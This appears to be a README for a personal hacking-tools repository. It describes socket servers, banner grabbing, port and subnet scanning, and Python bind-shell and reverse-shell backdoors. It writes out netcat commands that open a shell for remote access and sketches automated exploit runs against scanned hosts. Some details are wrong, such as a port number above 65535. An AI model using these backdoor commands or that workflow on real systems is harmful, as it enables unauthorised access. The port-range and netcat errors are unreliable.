# pwnn3t

Just some wizardry and setups while writing my own tools.

Platform: Debian GNU/Linux.

All tools are written for TCP/IP


# ascii-server.c
A C program for a server. It's a server, which means it offers a service. What service? ASCII transfer. If it would offer the service of transferring files, it would be an FTP server. What are the other services? Do a "cat /etc/services" to find out. How do I run this program? Do a "./start-service 2171" and fire up another terminal, write "telnet localhost 2171".... This program unravels many concepts about networking. Ports, services, C socket programming, protocols, protocol families, how to implement them, et cetera. Learn how to use telnet, ssh, ftp and sftp.... Play around with these tools on your Linux system for a few hours.... Set up SSH on your local machine and thus make it an SSH server, set up an FTP server, connect to your machine through another.... Do some shell execution and file transfers.... Just set up SSH and FTP and play around with the tools. Why do all these exercises? To learn. The more you experiment, the more you unravel, the more you learn. And you're gonna need these concepts to write the next tool. EXPERIMENT AS MUCH AS YOU CAN. When you learnt your native language, you listened to others speak, spoke yourself, did mistakes, experimented and you experiment and thus learn everytime you say something or write something in that language. The same goes for computers. The more you experiment, the more you unravel, the more you learn. Example: You take the IP address of the computer with this server, and instead of doing it on localhost, you do it through telnet directly on the server through another computer. This gives you ideas about hostnames and internet addresses. This is just an example. Do it more than just this, better than just this.

# ascii-client.c
A C program for a client compatible with ascii-server.c
Do a "./start-service 2171" to start the server and make it listen on port 2171
Fire up another terminal, type "./client 127.0.0.1 2171" to connect to localhost on port 2171
When using more than one machines, type the IP address of the remote host instead of 127.0.0.1
127.0.0.1 indicates "this computer".... To unravel more, learn about hostnames and TCP/IP basics.

# bangrab.c
A banner grabber in C. What a banner grabber does is loosely service(also called a daemon very often) reconnaissance on a given remote host. For example, how do you know if which services out of the tons of services is up and running on a given server? bangrab will help you find out.... It tells you what services are up and running... Now that you know the default ports for services can make a hacker hook on to your system, you might want to change the default port of your SSH server, or some hacker will gain the shell of your system.... There are numerous benefits of doing this.... If you change the SSH port to say "335647", the hacker can know that the server is listening on port 335647, but he can't be sure if it's SSH.... You could swap default ports of many services, say, SSH, FTP and SMTP, and thus make the hacker pull his hair out because he'll be able to find out that the server is listening on the port 22, but it won't be SSH..... but that doesn't help!!!! For example,  your ip is 1.1.1.1 --- your class d subnet is 1.1.1.1, 1.1.1.2, ...., 1.1.1.255 --
first step determine which hosts are alive.
second step - scan 65535 ports of each host that is alive dumping the banner of each port.
now you have data
1.1.1.1 was up -- it's open ports were 21,22,60000
1.1.1.2 was down
1.1.1.3 was up -- it's open ports were 50000,50001
etc..
you have the banners if there were
on host 1.1.1.3 -- it's open port 500001
1.1.1.3:50001 banner was SSH-2.0-OpenSSH_6.7p1 Raspbian-5+deb8u3

your program was automated to seek SSH banners for example

scan the banner string for SSH -- see how SSH is in there?

now that we have found ssh.. we never cared about the port, we cared about the banner. now we launch an automation. on host 1.1.1.3 on port 50001 we execute a command on it like say exploit.c

it automates ie: ./exploit 1.1.1.3 50001 or for test exercises `ping 1.1.1.3 50001` .. ping can be anything. it's the logic and practice.

# pls.c
A TCP port scanner in C. It's short for "port ls". It doesn't dump the banners for the ports and that's almost useless, but it's a good exercise if you don't understand the banner grabber.

# recon.sh
A bash script for the reconnaissance of all alive hosts on a network through subnet masks scanning.

# recon.py
A powerful Python replacement for recon.sh

# binshell.py
Socket backdoor in Python
A backdoor or backconnect is some sort of way you use to give yourself later access to a system you got access to. Thus, the name backdoor. A door you engineer to again get into a house you once somehow broke into.
A bind shell is a sort of backdoor that binds you to a shell on the victim (say /bin/sh) through sockets.
Similar to, uhh, 'nc -l 1337 -e /bin/bash' and then you connect to the victim by typing 'nc 0.0.0.0 1337' on the client(note the IP address and port is something you should change according to your necessity)

# revsh.py
Reverse Shell backdoor in Python
Unlike a bind shell, a reverse shell is a backdoor where the listener is on the attacker's side, and the victim connects to the listener, giving the listener access to it's shell. When doing by hand, run 'nc -vlp 31337' on the attack box and 'nc (remote host) 31337' on the victim.
.
Stay Curious
Never Stop Building
Happy Hacking
.
k4m1k4z13r
